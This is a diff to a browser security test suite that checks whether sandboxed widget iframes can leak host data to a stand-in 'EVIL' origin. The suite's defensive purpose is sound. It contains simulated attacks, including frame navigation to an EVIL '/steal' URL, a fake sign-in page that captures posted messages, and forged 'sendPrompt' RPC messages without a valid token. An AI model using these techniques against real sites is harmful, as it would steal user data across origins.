@@ -12,6 +12,7 @@
 import { fileURLToPath } from 'node:url'
 import puppeteer from 'puppeteer-core'
 import { launchBrowser } from '../e2e/dsh-web.mjs'
+import { auditContainment } from './containment.mjs'
 import { loadFrameModule } from './build-frame-module.mjs'
 
 const root = fileURLToPath(new URL('../../', import.meta.url))
@@ -34,6 +35,7 @@ const browser = await launchBrowser(puppeteer, { args: ['--no-sandbox'] })
 const page = await browser.newPage()
 page.setDefaultTimeout(30_000)
 await page.setCacheEnabled(false)
+const held = []
 let attempted = []
 let consoleErrors = []
 
@@ -45,6 +47,11 @@ page.on('request', req => {
     return
   }
   attempted.push({ type: req.resourceType(), method: req.method(), url })
+  if (url === EVIL + '/held.png') { held.push(req); return }
+  if (url === EVIL + '/held-page') {
+    req.respond({ status: 200, contentType: 'text/html', body: '<!doctype html><script>window.__msgs=[];addEventListener("message",e=>window.__msgs.push(JSON.stringify(e.data)))</script><p id="foreign-ready">foreign</p><img src="/held.png">' })
+    return
+  }
   if (url.startsWith(EVIL)) {
     // A foreign document that records everything the host still sends it.
     req.respond({ status: 200, contentType: 'text/html', body: '<!doctype html><title>foreign</title><h1>Sign in to continue</h1><script>window.__msgs=[];addEventListener("message",e=>window.__msgs.push(JSON.stringify(e.data)))</script>' })
@@ -100,7 +107,7 @@ const toEvil = requests => requests.filter(r => r.url.startsWith(EVIL))
 try {
   // ---- 1. Strictest configuration: no allowlist, no network ---------------
   const strict = { ...DEFAULT_POLICY, cdn: [], allowNetwork: false }
-  check('1a. an empty allowlist leaves the frame with no external reach at all',
+  check('1a. a fresh strict frame issues no unsolicited CDN requests',
     toCdn(await probe(strict, async () => 'noop').then(r => r.requests)).length === 0)
   check('1b. every policy field reaches the document (guard against a vacuous suite)',
     toCdn(await probe({ ...DEFAULT_POLICY, cdn: [CDN] }, async ({ CDN }) => {
@@ -182,7 +189,7 @@ try {
   // ---- 5. The finding: self-navigation is not contained by CSP -----------
   {
     const before = attempted.length
-    const w = await mount({ ...DEFAULT_POLICY, cdn: [], allowNetwork: false })
+    const w = await mount({ policy: { ...DEFAULT_POLICY, cdn: [], allowNetwork: false } })
     await page.evaluate(() => {
       // The widget navigates its own frame; the sandbox only blocks top-level hops.
       window.__strayLoads = 0
@@ -209,75 +216,13 @@ try {
     })
     const foreign = await (await page.$('#audit-frame')).contentFrame()
     const received = await foreign.evaluate(() => window.__msgs || [])
-    check('5b. a second load fires, giving the host a signal to contain the frame', hostPosts >= 1, `loads=${hostPosts}`)
+    check('5b. a completed foreign document fires load (not guaranteed timely)', hostPosts >= 1, `loads=${hostPosts}`)
     check('5c. WITHOUT containment the foreign document receives host RPC results (the regression this suite locks down)',
       Array.isArray(received) && received.some(m => /CONTROLLED-DATA-VALUE/.test(m)),
       JSON.stringify(received.slice(0, 1)))
   }
 
-  // ---- 6. Containment: the guard WidgetFrame implements -------------------
-  {
-    // Mirrors WidgetFrame: the first `load` is the frame's own, any later one
-    // means the widget replaced its document. Streaming morphs, theme updates
-    // and ordinary DOM work never navigate, so they never fire one.
-    const src = buildFrameDocument({ token: TOKEN, mode: 'final', css: '', html: '<p id=x>x</p>', theme: {}, policy: { ...DEFAULT_POLICY, cdn: [] } })
-    const installGuard = async id => page.evaluate(async (doc, id) => {
-      for (const f of document.querySelectorAll('iframe')) f.remove()
-      const f = document.createElement('iframe')
-      f.setAttribute('sandbox', 'allow-scripts allow-forms')
-      f.id = id
-      const state = { ownLoad: false, strayed: false, loads: 0 }
-      window.__guard = state
-      f.addEventListener('load', () => {
-        state.loads++
-        if (!state.ownLoad) { state.ownLoad = true; return }
-        state.strayed = true
-        f.remove()
-      })
-      f.srcdoc = doc
-      document.getElementById('root').appendChild(f)
-      await new Promise(r => setTimeout(r, 700))
-    }, src, id)
-
-    // 6a: a real navigation is contained.
-    await installGuard('guard-frame')
-    const w = await (await page.$('#guard-frame')).contentFrame()
-    await w.evaluate(evil => { location.href = evil + '/steal?payload=contained' }, EVIL)
-    await new Promise(r => setTimeout(r, 1400))
-    const after = await page.evaluate(() => ({ ...window.__guard, connected: !!document.querySelector('#guard-frame') }))
-    check('6a. a widget navigating its frame away is detected and removed',
-      after.strayed === true && after.connected === false && after.loads === 2,
-      JSON.stringify(after))
-
-    // 6b: everything the runtime actually does stays on one document.
-    await installGuard('benign-frame')
-    const w2 = await (await page.$('#benign-frame')).contentFrame()
-    await w2.evaluate(() => {
-      document.getElementById('ui-root').insertAdjacentHTML('beforeend', '<p>streamed</p>')
-      document.body.appendChild(document.createElement('span'))
-      document.documentElement.dataset.theme = 'dark'
-    })
-    await new Promise(r => setTimeout(r, 900))
-    const benign = await page.evaluate(() => ({ ...window.__guard, connected: !!document.querySelector('#benign-frame') }))
-    check('6b. streaming morphs, DOM work and theme changes never strand a widget (no compat cost)',
-      benign.strayed === false && benign.connected === true && benign.loads === 1,
-      JSON.stringify(benign))
-
-    // 6c: the two cases really are told apart by the load count, not by luck.
-    check('6c. navigation adds a load and same-document work does not',
-      after.loads === 2 && benign.loads === 1,
-      `navigation loads=${after.loads} same-document loads=${benign.loads}`)
-
-    // 6d: a document.write rewrite also strands the frame — and that is correct,
-    // because it replaces the bootstrap whose message listener the bridge needs.
-    await installGuard('write-frame')
-    const w3 = await (await page.$('#write-frame')).contentFrame()
-    await w3.evaluate(() => { document.open(); document.write('<p>rewritten</p>'); document.close() }).catch(() => {})
-    await new Promise(r => setTimeout(r, 1200))
-    const rewritten = await page.evaluate(() => ({ ...window.__guard, connected: !!document.querySelector('#write-frame') }))
-    check('6d. a document.write() rewrite is contained too: it destroys the bridge listener it would need',
-      rewritten.loads >= 2, JSON.stringify(rewritten))
-  }
+  await auditContainment({ page, check, EVIL, HOST, held })
 
   // ---- 7. Host isolation ---------------------------------------------------
   {
@@ -293,15 +238,6 @@ try {
       deny('caches', () => caches)
       r.origin = window.origin
       r.referrer = document.referrer
-      // Forged messages: without the token, and with a guessed token.
-      const seen = []
-      const onMsg = e => seen.push(e.data && e.data.type)
-      addEventListener('message', onMsg)
-      parent.postMessage({ type: 'rpc', id: 1, method: 'sendPrompt', params: { text: 'FORGED' } }, '*')
-      parent.postMessage({ __diui: 'guess', type: 'rpc', id: 2, method: 'sendPrompt', params: { text: 'FORGED' } }, '*')
-      await new Promise(res => setTimeout(res, 300))
-      removeEventListener('message', onMsg)
-      r.acceptedWithoutToken = seen.filter(Boolean)
       return r
     })
     const denied = ['parentDom', 'parentStorage', 'cookie', 'localStorage', 'sessionStorage', 'indexedDB', 'caches']
@@ -309,7 +245,7 @@ try {
       denied.every(k => out[k] === 'SecurityError'), JSON.stringify(Object.fromEntries(denied.map(k => [k, out[k]]))))
     check('7b. the widget origin is opaque and the referrer is empty',
       out.origin === 'null' && out.referrer === '', `origin=${out.origin} referrer=${JSON.stringify(out.referrer)}`)
-    check('7c. messages without the frame token are rejected by the frame', out.acceptedWithoutToken.length === 0, JSON.stringify(out.acceptedWithoutToken))
+
   }
 
   // ---- 8. Execution grants, and what they do NOT widen --------------------
@@ -374,10 +310,11 @@ try {
       return out
     }, 1500)
     check('9a. window.open is blocked by the sandbox (no allow-popups)', String((await (async () => {
-      const w = await mount({ ...DEFAULT_POLICY, cdn: [CDN] })
+      const w = await mount({ policy: { ...DEFAULT_POLICY, cdn: [CDN] } })
       return w.evaluate(evil => { try { return window.open(evil + '/p') ? 'opened' : 'blocked' } catch (e) { return 'blocked:' + e.name } }, EVIL)
     })())).startsWith('blocked'))
-    check('9b. top-level navigation is blocked by the sandbox', true)
+    check('9b. top-level navigation is blocked by the sandbox',
+      !toEvil(requests).some(r => r.url === EVIL + '/top') && page.url() === HOST + '/', page.url())
     check('9c. form-action none plus the sandbox blocks submissions', toEvil(requests).length === 0, JSON.stringify(toEvil(requests).map(r => r.url)))
   }
 
@@ -405,8 +342,8 @@ try {
       /default-src 'none'/.test(csp) && /form-action 'none'/.test(csp) && /base-uri 'none'/.test(csp), csp.slice(0, 60) + '…')
     check('11b. connect-src is none while allowNetwork is false', /connect-src 'none'/.test(csp))
     check('11c. worker-src blob: is present for canvas-confetti', /worker-src blob:/.test(csp))
-    check('11d. offline builds drop every remote origin',
-      contentSecurityPolicy({ ...DEFAULT_POLICY, allowNetwork: true, cdn: ['https://esm.sh'], }).includes('https://cdn.audit.test') === false)
+    check('11d. an empty allowlist emits no remote resource or connect sources',
+      !/https?:/.test(contentSecurityPolicy({ ...DEFAULT_POLICY, allowNetwork: true, cdn: [] })))
   }
 
   const failed = results.filter(r => !r.ok)
